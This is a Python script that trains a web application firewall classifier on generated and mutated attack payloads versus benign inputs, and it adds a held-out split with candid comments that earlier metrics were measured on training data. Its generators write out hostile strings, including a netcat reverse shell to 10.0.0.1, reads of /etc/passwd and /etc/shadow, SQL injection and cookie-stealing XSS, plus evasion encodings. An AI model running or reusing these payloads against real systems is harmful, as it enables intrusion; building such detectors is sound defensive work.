#!/usr/bin/env python3
"""Retrain with adversarial-benign FP suppression.

Same architecture as train_balanced.py (per-category-balanced attacks,
mutation-augmented, char-n-gram logistic regression), but with:
- K=32768 (more hash buckets for expanded vocab)
- C=0.15 (stronger L2 to hold TN under adversarial benign)
- Adversarial benign from FP payloads + generated prose with SQL/JS/shell keywords
- More URL-encoded benign and form-wrapped benign

Usage: train_fp_suppression.py [K] [OUT.json]
"""
import csv, glob, re, random, os, sys, urllib.parse
import numpy as np
from sklearn.linear_model import LogisticRegression
from scipy import sparse

K = int(sys.argv[1]) if len(sys.argv) > 1 else 32768
OUT = sys.argv[2] if len(sys.argv) > 2 else "payload_ngram_fp_suppress.json"
NS = [2, 3, 4]; MAXLEN = 512
C_REG = 0.25  # moderate L2 — balance TP/TN under adversarial benign
BASE = "/tmp/claude-1000/-home-ayush3750-waf-development"
OLD = f"{BASE}/24905267-7ca1-4d87-9e75-328eeac4243f/scratchpad/ml-corpus"
EVA = f"{BASE}/cbcb63a2-92d2-4e2b-ab24-29bdba5eb6c3/scratchpad/evasion-corpus"
HARD = f"{BASE}/cbcb63a2-92d2-4e2b-ab24-29bdba5eb6c3/scratchpad/hard-benign"
BEN = f"{BASE}/cbcb63a2-92d2-4e2b-ab24-29bdba5eb6c3/scratchpad/benign-corpus"
ADV = "adversarial_benign.txt"
rng = random.Random(1337)
FNV=2166136261; PR=16777619; M=0xFFFFFFFF
_HC={}
def bk(ng):
    v=_HC.get(ng)
    if v is None:
        h=FNV
        for x in ng: h^=x; h=(h*PR)&M
        v=h%K; _HC[ng]=v
    return v
def buckets(t):
    b=t.lower()[:MAXLEN].encode("utf-8","ignore"); n=len(b); s=set()
    for ng in NS:
        for i in range(n-ng+1): s.add(bk(b[i:i+ng]))
    return s
def matrix(ts):
    rows=[];cols=[]
    for r,t in enumerate(ts):
        for c in buckets(t): rows.append(r); cols.append(c)
    return sparse.csr_matrix((np.ones(len(rows),np.float32),(rows,cols)),shape=(len(ts),K))
def lines(f):
    if not os.path.exists(f): return []
    return [l.rstrip("\n").rstrip("\r") for l in open(f,encoding="utf-8",errors="ignore")
            if l.strip() and not l.startswith("#") and not l.lower().startswith("404:")]

# ---- per-category balanced load of the evasion corpus ----
CAT_QUOTA = {
    "xss": 7000, "cmdi": 6000, "sqli": 3200, "ssti": 2200,
    "lfi": 5000, "traversal": 3000, "xxe": 1000, "ldap": 500,
    "nosqli": 500, "crlf": 500,
}
def load_by_category():
    by_cat = {}
    for f in sorted(glob.glob(f"{EVA}/*.txt")):
        cat = os.path.basename(f).split("_", 1)[0]
        by_cat.setdefault(cat, []).extend(lines(f))
    out = []
    for cat, quota in CAT_QUOTA.items():
        pool = [a for a in dict.fromkeys(by_cat.get(cat, [])) if 3 <= len(a) <= MAXLEN]
        rng.shuffle(pool)
        take = pool[:quota]
        out += take
        print(f"  cat {cat:10s}: have {len(pool):6d}  take {len(take):6d}")
    return out

def load_dir(d, cap, exclude=None):
    out=[]
    for f in sorted(glob.glob(f"{d}/*.txt")):
        if exclude and exclude in os.path.basename(f): continue
        out+=lines(f)
    out=[a for a in dict.fromkeys(out) if 3<=len(a)<=MAXLEN]; rng.shuffle(out)
    return out[:cap]

# ---- mutation engine ----
def url_enc(s):       return urllib.parse.quote(s, safe='')
def url_enc_part(s):  return ''.join('%%%02X'%ord(c) if c in '<>\'"();&|=/ *' and ord(c)<128 else c for c in s)
def double_url(s):    return url_enc(url_enc(s))
def entity_enc(s):    return ''.join('&#%d;'%ord(c) if c in '<>\'"&/():;=' else c for c in s)
def entity_hex(s):    return ''.join('&#x%x;'%ord(c) if c in '<>\'"&/():;=' else c for c in s)
def rand_case(s):     return ''.join(c.upper() if rng.random()<0.5 else c.lower() for c in s)
def sql_comment(s):   return s.replace(' ', '/**/')
def ws_vary(s):       return s.replace(' ', rng.choice(['\t','\n','\x0b','\x0c','  ','+','%20']))
def kw_split(s):
    m=re.search(r'[A-Za-z]{5,}', s)
    if not m: return s
    i=m.start()+len(m.group())//2
    return s[:i]+'/**/'+s[i:]
def ifs_sub(s):       return s.replace(' ', rng.choice(['${IFS}','$IFS$9','${IFS%??}']))
def shell_quote(s):
    m=re.search(r'[A-Za-z]{3,}', s)
    if not m: return s
    i=m.start()+1
    return s[:i]+rng.choice(["''",'""'])+s[i:]
MUTATORS=[url_enc, url_enc_part, double_url, entity_enc, entity_hex, rand_case,
          sql_comment, ws_vary, kw_split, ifs_sub, shell_quote]

def augment_attacks(base, per=4):
    out=set(base)
    for p in base:
        for f in rng.sample(MUTATORS, per):
            try:
                m=f(p)
                if 3<=len(m)<=MAXLEN: out.add(m)
            except Exception:
                pass
    return list(out)

# ---- generated structural attacks ----
def gen_xss(n):
    tg=["script","img","svg","iframe","body","a","div","details","object","video","input","form","style","math","marquee"]
    ev=["onload","onerror","onclick","onmouseover","ontoggle","onpointerover","onfocus","onanimationstart","onbeforetoggle"]
    js=["alert(1)","alert(document.cookie)","prompt(1)","confirm(1)","eval(name)","fetch('//x')","alert`1`","(alert)(1)"]
    o=set();k=0
    while len(o)<n and k<n*80:
        k+=1;t=rng.choice(tg);e=rng.choice(ev);p=rng.choice(js)
        o.add(rng.choice([f"<{t} {e}={p}>",f"<{t}>{p}</{t}>",f'\"><{t} {e}={p}>',f"javascript:{p}",f"<{t} src=x {e}={p}>",f"<svg><script>{p}</script></svg>"]))
    return list(o)
def gen_sqli(n):
    pre=["","'",'"',") ","1' ","admin' ","') ",'" '];bd=["OR 1=1","OR '1'='1","UNION SELECT NULL","UNION SELECT username,password FROM users","AND SLEEP(5)","; DROP TABLE users","AND updatexml(1,concat(0x7e,user()),1)","OR 1=1-- -","UNION ALL SELECT 1,2,3","; WAITFOR DELAY '0:0:5'"];sf=["","-- -"," #","/*","%00"]
    o=set();k=0
    while len(o)<n and k<n*80: k+=1;o.add((rng.choice(pre)+rng.choice(bd)+rng.choice(sf)).strip())
    return list(o)
def gen_cmdi(n):
    sep=[";","|","||","&&","&","\n","`","$(",")","%0a"]
    cmd=["cat /etc/passwd","id","whoami","uname -a","ls -la /","curl http://x/","wget http://x/","nc -e /bin/sh 10.0.0.1 4444",
         "ping -c 4 127.0.0.1","sleep 5","cat /etc/shadow","python -c 'import os'","bash -i","/bin/sh -i","echo vuln","rm -rf /tmp/x"]
    pre=["","127.0.0.1","test","file.txt","1","admin"]
    o=set();k=0
    while len(o)<n and k<n*80:
        k+=1;s=rng.choice(sep);c=rng.choice(cmd);p=rng.choice(pre)
        o.add(rng.choice([f"{p}{s}{c}",f"{p} {s} {c}",f"$({c})",f"`{c}`",f"{p};{c};",f"|{c}"]))
    return list(o)

# ---- assemble attacks ----
print("loading evasion corpus (per-category balanced)...", flush=True)
base_atk = load_by_category() + gen_xss(3000) + gen_sqli(3000) + gen_cmdi(3000)
base_atk = list(dict.fromkeys([a for a in base_atk if a]))
atk = augment_attacks(base_atk, per=4)
print(f"attacks: {len(base_atk)} base -> {len(atk)} mutation-augmented", flush=True)

# ---- benign: real legit code + FWAF + HttpParams + adversarial-benign ----
hard = load_dir(HARD, 14000, exclude="prose_security")
fwaf = load_dir(BEN, 20000)
hp_rows = list(csv.DictReader(open(f"{OLD}/HttpParamsDataset/payload_full.csv")))
hp_ben = [r["payload"] for r in hp_rows if r["label"]=="norm"]
# Adversarial benign: FP payloads + prose with attack keywords
adv_ben = lines(ADV)
print(f"adversarial benign: {len(adv_ben)}", flush=True)
# More encoded-benign
enc_pool = rng.sample(hard+fwaf+adv_ben, min(8000, len(hard)+len(fwaf)+len(adv_ben)))
enc_benign = [url_enc_part(b) for b in enc_pool[:4000]]
enc_full = [url_enc(b) for b in enc_pool]
form_benign = [f"{rng.choice(['q','field','data','input','name','value','text'])}={url_enc(b)}"
               for b in rng.sample(hard+fwaf+adv_ben, min(4000, len(hard)+len(fwaf)+len(adv_ben)))]
ben = hard + fwaf + hp_ben + adv_ben + enc_benign + enc_full + form_benign

# ─────────────────────────────────────────────────────────────────────────────
# HELD-OUT SPLIT.
#
# Every metric this script used to print was measured ON ITS OWN TRAINING DATA:
#   adv_ben = lines(ADV)          -> went into `ben` -> into `allX` (trained on)
#   test_adv = lines(ADV)[:2000]  -> the FIRST 2000 lines of that same file
# and the "hard-benign" figure sampled `hard`, which is likewise inside `ben`. The
# variable was named test_adv, but nothing was held out, so those numbers described
# memorisation and could not tell you whether the model generalises at all. The
# gen-XSS/SQLi/CMDi "sanity" recalls have the same defect: they draw from the same
# generators that produced the training attacks.
#
# HOLDOUT (fraction, env var) reserves a stratified slice of BOTH pools before
# fitting, so the reported numbers are a real generalisation estimate.
#
# Default is 0.0 — training on everything — so a plain run still reproduces the
# shipped model byte for byte. Set HOLDOUT=0.15 to MEASURE; do not ship a model
# trained on a reduced set without saying so.
HOLDOUT = float(os.environ.get("HOLDOUT", "0"))

def stratified_split(pool, frac):
    """Return (train, held) with `held` a random `frac` of `pool`."""
    if frac <= 0 or len(pool) < 10:
        return pool, []
    shuffled = list(pool)
    rng.shuffle(shuffled)
    n_held = max(1, int(len(shuffled) * frac))
    return shuffled[n_held:], shuffled[:n_held]

atk_tr, atk_held = stratified_split(atk, HOLDOUT)
ben_tr, ben_held = stratified_split(ben, HOLDOUT)

allX = atk_tr + ben_tr
allY = np.r_[np.ones(len(atk_tr),np.float32), np.zeros(len(ben_tr),np.float32)]
print(f"train: {len(allX)} ({len(atk_tr)} atk / {len(ben_tr)} benign [{len(hard)} hard + {len(fwaf)} fwaf + {len(hp_ben)} hp + {len(adv_ben)} adv + {len(enc_benign)} enc-part + {len(enc_full)} enc-full + {len(form_benign)} form])", flush=True)
if HOLDOUT > 0:
    print(f"HELD OUT: {len(atk_held)} atk / {len(ben_held)} benign ({HOLDOUT:.0%}) — never seen during fit", flush=True)
else:
    print("HELD OUT: nothing (HOLDOUT unset) — every metric below is TRAINING-SET performance,", flush=True)
    print("          i.e. memorisation, NOT a generalisation estimate. Set HOLDOUT=0.15 to measure.", flush=True)
print(f"featurizing (K={K}, C={C_REG})...", flush=True)
clf=LogisticRegression(C=C_REG,class_weight="balanced",max_iter=4000,solver="liblinear").fit(matrix(allX), allY)

# ── Metrics ──────────────────────────────────────────────────────────────────
# Labelled TRAIN or HELD-OUT so a reader cannot mistake one for the other.
TAG = "HELD-OUT" if HOLDOUT > 0 else "TRAIN"

def recall_at(g, thr):
    """Fraction of attack samples scored >= thr (detection rate)."""
    if not g: return float("nan")
    return (clf.predict_proba(matrix(g))[:,1] >= thr).mean()*100

def benign_pass_at(g, thr):
    """Fraction of benign samples scored < thr (correctly NOT flagged)."""
    if not g: return float("nan")
    return (clf.predict_proba(matrix(g))[:,1] < thr).mean()*100

if HOLDOUT > 0:
    tpr = recall_at(atk_held, 0.9)
    tnr = benign_pass_at(ben_held, 0.15)
    fpr = 100.0 - tnr
    print(f"  [{TAG}] attack TPR@0.9      = {tpr:.2f}%")
    print(f"  [{TAG}] benign TNR@0.15     = {tnr:.2f}%   (FPR = {fpr:.2f}%)")
    print(f"  [{TAG}] samples             = {len(atk_held)} atk / {len(ben_held)} benign")
    print()
    print("  Compare FPR against commercial WAFs (~0.01-0.4%), not against the")
    print("  training-set figures below — those are not comparable to anything.")

# These remain useful as smoke checks (a broken featuriser shows up here) but are
# explicitly training-set/in-distribution numbers, so they are labelled as such.
print(f"  [TRAIN, in-distribution] gen-XSS recall@0.9 = {recall_at(gen_xss(400),0.9):.1f}%"
      f"   gen-SQLi = {recall_at(gen_sqli(400),0.9):.1f}%"
      f"   gen-CMDi = {recall_at(gen_cmdi(400),0.9):.1f}%")
print(f"  [TRAIN] adversarial-benign pass@0.15 = {benign_pass_at(lines(ADV)[:2000],0.15):.1f}%"
      f"  (this file is IN the training set — not a generalisation number)")
print(f"  [TRAIN] hard-benign pass@0.15 = {benign_pass_at(rng.sample(hard, min(1000, len(hard))),0.15):.1f}%")

if HOLDOUT > 0:
    print()
    print("NOTE: this model was fit on a REDUCED training set because HOLDOUT>0.")
    print("      Use it to measure, then retrain with HOLDOUT unset to ship.")

# export
import json, math
w=clf.coef_[0].tolist(); b=float(clf.intercept_[0])
with open(OUT,"w") as f:
    json.dump({"k":K,"ngrams":NS,"bias":round(b,6),"weights":[round(x,6) for x in w]},f)
print(f"exported {OUT}", flush=True)
print(f"copy to: cp {OUT} ../model/payload_ngram.json", flush=True)